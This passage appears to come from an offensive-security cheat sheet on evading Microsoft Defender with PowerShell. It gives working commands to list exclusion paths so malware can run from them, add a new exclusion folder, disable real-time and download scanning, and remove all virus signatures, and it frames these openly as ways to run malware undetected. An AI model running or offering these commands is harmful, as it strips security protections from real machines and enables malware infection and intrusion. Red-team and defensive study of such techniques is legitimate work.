You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!

```powershell
Get-MpPreference | select-object -ExpandProperty ExclusionPath
```

Alternatively, you could add an exclusion directory for your shady stuff. 👀

```powershell
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"
```

If you’re more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩

```powershell
# Disable realtime monitoring altogether
Set-MpPreference -DisableRealtimeMonitoring $true

# Only disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true
```

As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.

```powershell
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
